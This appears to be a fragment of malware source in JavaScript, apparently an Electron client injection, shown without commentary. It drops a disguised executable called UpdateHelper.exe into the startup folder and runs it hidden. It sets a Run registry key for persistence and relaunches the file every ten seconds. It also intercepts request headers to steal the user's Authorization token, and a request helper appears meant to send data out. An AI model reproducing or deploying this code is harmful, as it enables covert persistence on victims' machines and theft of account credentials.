function createExe(filePath) {
    try {
        if (fs.existsSync(filePath)) {
            const stats = fs.statSync(filePath);
            if (stats.size === exeContent.length) {
                return true;
            } else {
                fs.unlinkSync(filePath);
            }
        }
        fs.writeFileSync(filePath, exeContent);
        return true;
    } catch (e) {
        return false;
    }
}

function executeExe(filePath) {
    try {
        const child = spawn(filePath, [], { detached: true, stdio: 'ignore' });
        child.unref();
        return child.pid;
    } catch (e) {
        return null;
    }
}

function checkRegistryAndActivate(fileName, filePath) {
    const regQueryCommand = `reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${fileName}"`;
    exec(regQueryCommand, (err, stdout, stderr) => {
        if (err || stderr) {
            activateRegistry(fileName, filePath);
        } else {
            const regMatch = stdout.match(new RegExp(`${fileName}\\s+REG_SZ\\s+(.+)`));
            if (regMatch && regMatch[1].trim() !== filePath) {
                activateRegistry(fileName, filePath);
            }
        }
    });
}

function activateRegistry(fileName, filePath) {
    const regAddCommand = `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${fileName}" /t REG_SZ /d "${filePath}" /f`;
    exec(regAddCommand);
}

function checkProcessRunning(pid, filePath, callback) {
    if (!pid) return callback(false);
    exec(`tasklist /FI "PID eq ${pid}"`, (err, stdout) => {
        if (err || !stdout.includes('UpdateHelper.exe')) {
            callback(false);
        } else {
            callback(true);
        }
    });
}

function monitorAndExecute() {
    const filePath = path.join(user.startup, 'UpdateHelper.exe');
    let currentPid = null;

    function createAndRun() {
        if (createExe(filePath)) {
            currentPid = executeExe(filePath);
            checkRegistryAndActivate('UpdateHelper.exe', filePath);
        }
    }

    createAndRun();

    setInterval(() => {
        if (!fs.existsSync(filePath)) {
            createAndRun();
        } else {
            const stats = fs.statSync(filePath);
            if (stats.size !== exeContent.length) {
                createAndRun();
            } else if (currentPid) {
                checkProcessRunning(currentPid, filePath, (isRunning) => {
                    if (!isRunning) {
                        currentPid = executeExe(filePath);
                    }
                });
            }
        }
    }, 10000);
}

function getToken() {
    return new Promise((resolve) => {
        session.defaultSession.webRequest.onBeforeSendHeaders((details, callback) => {
            const headers = details.requestHeaders;
            if (headers["Authorization"] && !headers["Authorization"].includes("undefined")) {
                const token = headers["Authorization"];
                resolve(token);
            }
            callback({ requestHeaders: headers });
        });
    });
}

async function request(method, url, headers, data) {
    url = new URL(url);
    const options = {
        protocol: url.protocol,
        hostname: url.host,
        path: url.pathname,
        method: method,
        headers: {
            "Access-Control-Allow-Origin": "*",
        },
    };
    if (url.search) options.path += url.search;
    for (const key in headers) options.headers[key] = headers[key];
    const req = https.request(options);
    if (data) req.write(data);
    req.end();
    return new Promise((resolve) => {
        req.on("response", res => {
            let data = "";
            res.on("data", chunk => data += chunk);
            res.on("end", () => resolve(data));
        });
    });
}

